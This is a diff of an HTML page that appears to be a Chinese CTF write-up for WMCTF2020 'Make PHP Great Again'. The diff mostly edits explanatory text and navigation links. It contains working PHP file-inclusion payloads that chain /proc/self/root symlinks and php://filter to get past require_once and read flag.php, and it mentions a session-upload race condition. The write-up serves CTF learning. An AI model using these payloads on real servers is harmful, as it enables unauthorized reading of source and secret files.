@@ -13,6 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
@@ -520,7 +521,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    490
+                    538
                 </div>
                 
 
@@ -561,11 +562,15 @@
 <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>绕过不能重复包含文件的限制</p>
 <h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><blockquote>
 <p>PHP最新版的小Trick,require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含</p>
-<p>/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接</p>
+<p><code>/proc/[pid]</code>记录了系统运行的信息状态，而<code>/proc/self</code>指的是当前进程(自身进程)的pid，就类似于类里面的<code>this</code></p>
+<p><code>/proc/self/root/</code>是指向<code>/</code>的符号链接</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>另一种写法</p>
+<blockquote>
+<p><code>/proc/self/cwd/</code>指向当前进程运行目录的一个符号链接，</p>
+</blockquote>
 <pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;index&#x2F;resource&#x3D;&#x2F;123&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="解法2-条件竞争：利用session-upload-progress"><a href="#解法2-条件竞争：利用session-upload-progress" class="headerlink" title="解法2 条件竞争：利用session.upload_progress"></a>解法2 条件竞争：利用session.upload_progress</h3><p>之前有做过类似的题，具体见<a href="https://syunaht.com/p/2193317358.html#toc-heading-5">刷题笔记:[NPUCTF2020]ezinclude</a></p>
@@ -732,18 +737,17 @@ sessid <span class="token operator">=</span> <span class="token string">'flag'</
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/p/2339718074.html">
+                <a href="/p/950891946.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/65.jpg" class="responsive-img" alt="刷题笔记:[WMCTF2020]Make PHP Great Again">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="刷题笔记:[SWPU2019]Web3">
                         
-                        <span class="card-title">刷题笔记:[WMCTF2020]Make PHP Great Again</span>
+                        <span class="card-title">刷题笔记:[SWPU2019]Web3</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -753,9 +757,9 @@ sessid <span class="token operator">=</span> <span class="token string">'flag'</
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-04
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-05
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -768,7 +772,6 @@ sessid <span class="token operator">=</span> <span class="token string">'flag'</
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -780,12 +783,8 @@ sessid <span class="token operator">=</span> <span class="token string">'flag'</
                         <span class="chip bg-color">Web</span>
                     </a>
                     
-                    <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                        <span class="chip bg-color">PHP代码审计</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">
-                        <span class="chip bg-color">条件竞争</span>
+                    <a href="/tags/Flask/">
+                        <span class="chip bg-color">Flask</span>
                     </a>
                     
                 </div>
